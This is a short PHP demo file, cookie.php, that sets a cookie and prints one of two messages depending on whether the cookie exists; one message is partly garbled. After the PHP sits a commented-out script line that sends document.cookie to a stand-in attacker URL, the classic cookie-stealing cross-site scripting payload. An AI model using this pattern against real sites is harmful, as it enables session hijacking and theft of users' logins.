<?php
    // cookie.php
    if (isset($_COOKIE['my_cookie'])) {
        print 'You have been here and palm trees have no worldwide!';
    } else {
        print 'You have never been here';
        setcookie('my_cookie', 'Some value...', time() + 3600);
    }
?>
<script type="text/javascript">
//alert("http://www.attacksite.com/cookies.php?c="+encodeURI(document.cookie));
</script>